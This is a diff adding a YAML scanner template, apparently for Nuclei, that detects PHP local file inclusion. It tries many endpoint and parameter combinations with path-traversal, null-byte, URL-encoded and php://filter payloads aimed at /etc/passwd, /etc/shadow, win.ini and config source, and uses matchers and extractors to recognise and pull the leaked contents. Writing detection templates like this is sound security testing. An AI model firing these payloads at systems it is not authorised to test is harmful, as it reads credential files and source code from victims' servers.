@@ -1,0 +1,177 @@
+id: php-lfi-generic
+
+info:
+  name: PHP Local File Inclusion (LFI) - Generic Detection
+  author: custom
+  severity: critical
+  description: |
+    Detects Local File Inclusion (LFI) vulnerabilities in PHP applications.
+    Tests common file parameters with various path traversal and PHP wrapper payloads.
+  classification:
+    cwe-id: CWE-22
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: lfi,php,file-inclusion,path-traversal,custom
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{endpoint}}?{{param}}={{payload}}"
+
+    payloads:
+      endpoint:
+        - "/post_handler.php"
+        - "/handler.php"
+        - "/file.php"
+        - "/download.php"
+        - "/include.php"
+        - "/view.php"
+        - "/page.php"
+        - "/read.php"
+
+      param:
+        - "file"
+        - "page"
+        - "path"
+        - "template"
+        - "include"
+        - "view"
+        - "document"
+        - "load"
+        - "cat"
+        - "dir"
+
+      payload:
+        # Basic path traversal - Linux
+        - "../../../../etc/passwd"
+        - "../../../etc/passwd"
+        - "../../../../../../etc/passwd"
+        - "../../../../../../../../etc/passwd"
+
+        # Path traversal - Windows
+        - "../../../../windows/win.ini"
+        - "../../../windows/system32/drivers/etc/hosts"
+
+        # Nested path traversal
+        - "....//....//....//....//etc/passwd"
+        - "..../..../..../etc/passwd"
+
+        # Absolute paths
+        - "/etc/passwd"
+        - "/etc/shadow"
+        - "/var/www/html/index.php"
+
+        # PHP filter wrappers - Base64
+        - "php://filter/convert.base64-encode/resource=index"
+        - "php://filter/convert.base64-encode/resource=../index"
+        - "php://filter/convert.base64-encode/resource=config"
+        - "php://filter/convert.base64-encode/resource=/etc/passwd"
+
+        # PHP filter wrappers - ROT13
+        - "php://filter/read=string.rot13/resource=index"
+        - "php://filter/read=string.rot13/resource=/etc/passwd"
+
+        # Null byte (older PHP < 5.3.4)
+        - "../../../../etc/passwd%00"
+        - "../../../etc/passwd%00.jpg"
+
+        # URL encoding
+        - "..%2f..%2f..%2f..%2fetc%2fpasswd"
+        - "..%252f..%252f..%252fetc%252fpasswd"
+
+    attack: clusterbomb
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      # Matcher 1: Linux /etc/passwd content
+      - type: regex
+        name: unix-passwd-file
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "daemon:.*:1:1:"
+          - "www-data:.*:33:33:"
+        condition: or
+
+      # Matcher 2: Common user entries
+      - type: word
+        name: passwd-entries
+        part: body
+        words:
+          - "root:x:0:0"
+          - "/bin/bash"
+          - "/usr/sbin/nologin"
+        condition: and
+
+      # Matcher 3: Windows system files
+      - type: word
+        name: windows-files
+        part: body
+        words:
+          - "[extensions]"
+          - "[fonts]"
+          - "for 16-bit app support"
+        condition: or
+
+      # Matcher 4: Base64 encoded PHP content
+      - type: dsl
+        name: php-filter-base64
+        dsl:
+          - 'contains(body, "PD9waHA")'  # <?php
+          - 'status_code == 200'
+          - 'len(body) > 100'
+        condition: and
+
+      # Matcher 5: Base64 encoded HTML
+      - type: dsl
+        name: html-filter-base64
+        dsl:
+          - 'contains(body, "PGh0bWw")'  # <html
+          - 'contains(body, "PD")'
+          - 'status_code == 200'
+        condition: and
+
+      # Matcher 6: ROT13 encoded PHP
+      - type: word
+        name: php-filter-rot13
+        part: body
+        words:
+          - "<?cuc"  # <?php in ROT13
+          - "vapyhqr"  # include in ROT13
+          - "erdhver"  # require in ROT13
+        condition: or
+
+      # Matcher 7: Multiple passwd entries (high confidence)
+      - type: dsl
+        name: multiple-users
+        dsl:
+          - 'regex("([a-z_][a-z0-9_-]*):x:\\d+:\\d+:", body)'
+          - 'status_code == 200'
+        condition: and
+
+    extractors:
+      # Extract passwd file content
+      - type: regex
+        name: passwd-users
+        part: body
+        group: 1
+        regex:
+          - '(?m)^([a-z_][a-z0-9_-]*:x:\d+:\d+:[^:]*:[^:]*:[^\n]*)$'
+
+      # Extract base64 content
+      - type: regex
+        name: base64-content
+        part: body
+        regex:
+          - '[A-Za-z0-9+/]{150,}={0,2}'
+
+      # Extract vulnerable parameter and endpoint
+      - type: kval
+        name: vulnerable-details
+        kval:
+          - param
+          - endpoint
